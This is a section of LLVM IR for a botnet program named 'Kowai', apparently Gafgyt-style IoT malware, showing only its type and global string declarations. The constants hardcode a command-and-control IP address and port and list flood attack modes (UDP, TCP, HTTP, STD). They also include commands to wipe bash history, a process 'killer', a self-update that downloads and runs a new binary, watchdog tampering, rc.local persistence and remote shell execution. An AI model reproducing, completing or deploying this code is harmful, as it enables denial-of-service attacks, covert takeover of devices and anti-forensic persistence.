; ModuleID = 'host/ir_bcf/Kowai.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.state_t = type { i32, i8 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.killerinfo = type { i8* }
%struct.__dirstream = type opaque
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@cncip = global i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [16 x i8] c"178.128.154.119\00", align 1
@cncport = global i32 1994, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.32, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.3 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.4 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.6 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.7 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.10 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.11 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.12 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.17 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.18 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.19 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.21 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.22 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.23 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.24 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.25 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.27 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.28 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.29 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.30 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.32 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@hacked = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pgid = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.147 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.33 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.36 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.37 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.39 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.41 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.43 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.44 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.49 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.51 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.53 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.54 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.55 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.57 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.60 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.62 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.63 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.73 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.74 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.77 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.80 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.82 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.83 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.84 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.93 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.94 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.98 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.99 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"8UsA.sh\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.102 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"Successfully downloaded file\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"slumpthegod\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"./\00", align 1
@.str.107 = private unnamed_addr constant [11 x i8] c" Kowai.old\00", align 1
@.str.108 = private unnamed_addr constant [20 x i8] c"EXECUTED NEW BINARY\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"KILLER\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.113 = private unnamed_addr constant [15 x i8] c"KILLER STOPPED\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.115 = private unnamed_addr constant [15 x i8] c"KILLER STARTED\00", align 1
@.str.116 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.118 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.122 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"STOPATTK\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.131 = private unnamed_addr constant [33 x i8] c"kowai ohhhh that sad kid slump??\00", align 1
@.str.132 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.135 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.137 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.140 = private unnamed_addr constant [52 x i8] c"\1B[1;35mJoining\1B[1;32m > \1B[90m[\1B[1;33m%s\1B[90m]  \1B[0m\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"kowai V1\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.143 = private unnamed_addr constant [4 x i8] c"CMD\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.145 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
